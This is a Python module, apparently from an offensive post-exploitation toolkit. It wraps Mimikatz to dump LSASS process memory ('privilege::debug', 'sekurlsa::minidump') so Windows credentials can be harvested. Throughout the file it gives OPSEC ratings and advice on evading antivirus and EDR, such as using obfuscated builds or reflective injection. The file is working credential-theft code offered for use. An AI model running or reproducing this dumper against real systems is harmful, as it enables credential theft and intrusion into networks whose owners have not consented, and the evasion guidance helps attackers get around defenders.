#!/usr/bin/env python3
"""
LSASS dumping via Mimikatz
Classic tool but heavily signatured
"""

import os
import subprocess
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict

from ..utils import get_lsass_pid


class MimikatzDumper:
    """
    Dump LSASS using Mimikatz
    
    OPSEC Level: LOW
    - Heavily signatured by all major AV/EDR
    - Immediate alerts in most environments
    - Use obfuscated versions or reflective injection
    """
    
    METHOD_NAME = "mimikatz"
    OPSEC_RATING = "Low"
    
    def __init__(self, output_dir: Path, mimikatz_path: Optional[str] = None):
        self.output_dir = Path(output_dir)
        
        # Check common locations for mimikatz
        if mimikatz_path:
            self.mimikatz_path = mimikatz_path
        else:
            # Try common locations
            possible_paths = [
                r"C:\Windows\Temp\mimikatz.exe",
                r"C:\Tools\mimikatz.exe",
                r".\mimikatz.exe",
                "mimikatz.exe"
            ]
            
            self.mimikatz_path = None
            for path in possible_paths:
                if os.path.exists(path):
                    self.mimikatz_path = path
                    break
    
    def dump(self) -> Optional[Dict]:
        """
        Execute LSASS dump via Mimikatz
        
        Returns:
            Dict with dump metadata or None on failure
        """
        print(f"\n[*] Method: Mimikatz")
        print(f"[*] OPSEC: {self.OPSEC_RATING} - Heavily signatured by AV/EDR")
        print(f"[!] WARNING: This will likely trigger alerts")
        print(f"[!] Recommended: Use obfuscated version or inject reflectively")
        
        # Check if mimikatz exists
        if not self.mimikatz_path or not os.path.exists(self.mimikatz_path):
            print(f"[-] Mimikatz not found")
            print(f"[!] Searched: C:\\Windows\\Temp\\mimikatz.exe, C:\\Tools\\mimikatz.exe")
            print(f"[!] Download from: https://github.com/gentilkiwi/mimikatz")
            return None
        
        print(f"[+] Mimikatz found: {self.mimikatz_path}")
        
        # Create output file
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        dump_file = self.output_dir / f"lsass_mimikatz_{timestamp}.dmp"
        
        # Build Mimikatz commands
        # Use sekurlsa::minidump to create dump file
        commands = [
            "privilege::debug",
            f"sekurlsa::minidump {dump_file}",
            "exit"
        ]
        
        cmd = f'"{self.mimikatz_path}" "{" ".join(commands)}"'
        
        print(f"[*] Executing Mimikatz...")
        print(f"[*] Commands: {commands}")
        
        try:
            # Execute Mimikatz
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                timeout=30
            )
            
            # Verify dump was created
            if dump_file.exists():
                size = dump_file.stat().st_size
                
                print(f"[+] LSASS dumped successfully!")
                print(f"[+] Dump file: {dump_file}")
                print(f"[+] Size: {size / 1024 / 1024:.2f} MB")
                
                return {
                    'method': self.METHOD_NAME,
                    'file': str(dump_file),
                    'size': size,
                    'timestamp': timestamp,
                    'opsec_rating': self.OPSEC_RATING
                }
            else:
                print(f"[-] Dump file not created")
                print(f"[-] Mimikatz may have been blocked")
                
                if result.stdout:
                    print(f"[*] Output: {result.stdout.decode('utf-8', errors='ignore')}")
                
                return None
        
        except subprocess.TimeoutExpired:
            print(f"[-] Dump operation timed out")
            return None
        
        except Exception as e:
            print(f"[-] Dump failed: {e}")
            return None
    
    def is_available(self) -> bool:
        """Check if this method is available"""
        return self.mimikatz_path is not None and os.path.exists(self.mimikatz_path)
    
    @staticmethod
    def get_info() -> Dict:
        """Get information about this dump method"""
        return {
            'name': 'mimikatz',
            'description': 'Classic Mimikatz credential dumping',
            'opsec_rating': 'Low',
            'requirements': [
                'Administrative privileges',
                'mimikatz.exe (external tool)'
            ],
            'advantages': [
                'Well-documented and tested',
                'Can extract credentials directly',
                'Comprehensive credential harvesting',
                'Many variants available'
            ],
            'disadvantages': [
                'Heavily signatured by AV/EDR',
                'Immediate alerts in most environments',
                'Requires uploading binary',
                'Known IOCs and behaviors'
            ]
        }
